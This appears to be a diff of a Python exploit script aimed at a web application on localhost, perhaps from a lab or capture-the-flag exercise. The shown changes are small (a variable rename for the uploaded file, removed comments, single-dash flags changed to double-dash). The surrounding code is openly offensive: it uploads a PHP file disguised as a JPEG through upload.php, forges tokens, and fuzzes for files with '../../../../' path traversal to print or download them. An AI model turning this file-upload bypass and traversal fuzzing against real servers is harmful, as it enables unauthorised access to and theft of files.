@@ -23,7 +23,7 @@ ip = "127.0.0.1"
 url = f"{URL}/modules/upload.php"
 
 files = {
-    'image': ('badfile.php',file_content, 'image/jpeg')
+    'image': (filename_to_upload,file_content, 'image/jpeg')
 }
 
 def generate_token(id):
@@ -133,8 +133,7 @@ def fuzz(list,jwt_print, file_print, file_download,add_path):
 
         except BaseException:
             print(f'>>> File {file} exist but we don`t have permissions to read')
-        #print()
-        #time.sleep(0.5)
+
 
 
 
@@ -160,30 +159,30 @@ def print_banner():
 
 help = """
           MODES:
-                -interactive    
-                -fuzz
+                --interactive    
+                --fuzz
           INTERACTIVE MODE
                 VERBOSITY OPTIONS:      
-                      -jwt            Prints JWT
-                      -printFile      Prints file
+                      --jwt            Prints JWT
+                      --printFile      Prints file
                 OTHER:
-                      -download       Downloads file if it exists
+                      --download       Downloads file if it exists
           FUZZ MODE
-                -addPath              Add path traversal "../../../../"
-          -h                          Print this page
+                --addPath              Add path traversal "../../../../"
+          --help                       Print this page
                                     
 """
 
 
 parser = argparse.ArgumentParser(add_help=False)
 
-parser.add_argument("-interactive",action="store_true")
-parser.add_argument("-fuzz",default="")
-parser.add_argument("-help",action="store_true")
-parser.add_argument("-jwt",action="store_true")
-parser.add_argument("-printFile", action="store_true")
-parser.add_argument("-download", action="store_true")
-parser.add_argument("-addPath", action="store_true")
+parser.add_argument("--interactive",action="store_true")
+parser.add_argument("--fuzz",default="")
+parser.add_argument("--help",action="store_true")
+parser.add_argument("--jwt",action="store_true")
+parser.add_argument("--printFile", action="store_true")
+parser.add_argument("--download", action="store_true")
+parser.add_argument("--addPath", action="store_true")
 
 args = parser.parse_args()
 interactive_mode = args.interactive
